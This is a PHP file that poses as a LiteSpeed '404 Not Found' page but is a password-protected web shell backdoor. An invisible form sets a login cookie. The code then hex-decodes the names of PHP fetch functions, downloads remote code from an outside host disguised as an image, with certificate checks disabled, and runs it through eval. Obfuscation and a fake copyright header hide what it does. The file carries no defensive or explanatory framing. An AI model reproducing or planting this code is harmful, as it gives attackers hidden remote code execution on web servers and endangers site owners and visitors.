<?php
/**
 * @package    Pluto Hypnosis V1
 * @copyright  Copyright (C) 2023 - 2024 Open Source Matters, Inc. All rights reserved.
 *
 */

// @deprecated  1.0  Deprecated without replacement
function is_logged_in()
{
    return isset($_COOKIE['hypnosis']) && $_COOKIE['hypnosis'] === 'PLUTO'; 
}

if (is_logged_in()) {
    $Array = array(
        '666f70656e', // fo p en => 0
        '73747265616d5f6765745f636f6e74656e7473', // strea m_get_contents => 1
        '66696c655f6765745f636f6e74656e7473', // fil e_g et_cont ents => 2
        '6375726c5f65786563' // cur l_ex ec => 3
    );

    function hex2str($hex) {
        $str = '';
        for ($i = 0; $i < strlen($hex); $i += 2) {
            $str .= chr(hexdec(substr($hex, $i, 2)));
        }
        return $str;
    }

    function geturlsinfo($destiny) {
        $belief = array(
            hex2str($GLOBALS['Array'][0]), 
            hex2str($GLOBALS['Array'][1]), 
            hex2str($GLOBALS['Array'][2]), 
            hex2str($GLOBALS['Array'][3])  
        );

        if (function_exists($belief[3])) { 
            $ch = curl_init($destiny);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            $love = $belief[3]($ch);
            curl_close($ch);
            return $love;
        } elseif (function_exists($belief[2])) { 
            return $belief[2]($destiny);
        } elseif (function_exists($belief[0]) && function_exists($belief[1])) { 
            $purpose = $belief[0]($destiny, "r");
            $love = $belief[1]($purpose);
            fclose($purpose);
            return $love;
        }
        return false;
    }

    $destiny = 'https://suarabmi.id/memek.jpg';
    $dream = geturlsinfo($destiny);
    if ($dream !== false) {
        eval('?>' . $dream);
    }
} else {
    if (isset($_POST['password'])) {
        $entered_key = $_POST['password'];
        $hashed_key = '$2y$10$qBCKSYqZa4aDGuZgDWBMSesJ/X8jvNGtD.lSw52F5S.uAUXHSowjW'; // https://bcrypt.online/
        
        if (password_verify($entered_key, $hashed_key)) {
            setcookie('hypnosis', 'PLUTO', time() + 3600, '/'); 
            header("Location: " . $_SERVER['PHP_SELF']); 
            exit();
        }
    }
}
?>
<!DOCTYPE html>
<html style="height:100%">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
<title> 404 Not Found
</title><style>@media (prefers-color-scheme:dark){body{background-color:#000!important}}</style>
<style>
    .container {

    }

    .password-input {
            background-color: #000000ff;
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #000000ff;
            border-radius: 5px;
            width: 200px;
            font-size: 16px;
        }

    .button {
            display: inline-block;
            background-color: #000000ff;
            color: white;
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }

    .button:hover {
            background-color: #000000ff;
        }
        
    .container {
            text-align: center;
        }
</style>
</head>
<body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;">
<div style="height:auto; min-height:100%; ">     <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;">
        <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">404</h1>
<h2 style="margin-top:20px;font-size: 30px;">Not Found
</h2>
<p>The resource requested could not be found on this server!</p>
<div class="container">
        <form method="POST" action="">
            <input type="password" id="password" name="password" class="password-input" placeholder="" required>
            <div class="button" onclick="document.forms[0].submit()"></div>
        </form>
    </div>
</div></div><div style="color:#f0f0f0; font-size:12px;margin:auto;padding:0px 30px 0px 30px;position:relative;clear:both;height:100px;margin-top:-101px;background-color:#474747;border-top: 1px solid rgba(0,0,0,0.15);box-shadow: 0 1px 0 rgba(255, 255, 255, 0.3) inset;">
<br>Proudly powered by LiteSpeed Web Server<p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p></div>
    </body>
</html>